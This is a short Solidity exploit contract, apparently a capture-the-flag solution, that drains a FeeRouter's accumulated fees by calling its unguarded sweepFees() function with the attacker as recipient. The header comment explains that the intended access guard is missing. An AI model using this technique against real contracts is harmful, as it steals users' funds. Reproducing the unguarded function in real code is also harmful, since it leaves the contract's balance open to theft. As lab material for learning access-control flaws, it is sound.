// SPDX-License-Identifier: MIT
// FEE-SWEEP DRAIN (unprotected ledger class).
// Technique: sweepFees() ships without the intended onlyTreasury guard and
// pays an attacker-chosen recipient — the whole accumulated fee balance is
// one permissionless call away. No flash loan needed; the router itself is
// the vault.
pragma solidity ^0.8.0;

import {FeeRouter} from "../challenges/FeeRouter.sol";
import {ERC20Mintable} from "../tokens/ERC20Mintable.sol";

contract FeeSweepAttacker {
    FeeRouter public immutable router;
    address public immutable owner;

    constructor(address _router) {
        router = FeeRouter(_router);
        owner = msg.sender;
    }

    /// One call: sweep the router's entire fee balance to the attacker.
    function drain() external {
        router.sweepFees(owner);
    }

    receive() external payable {}
}
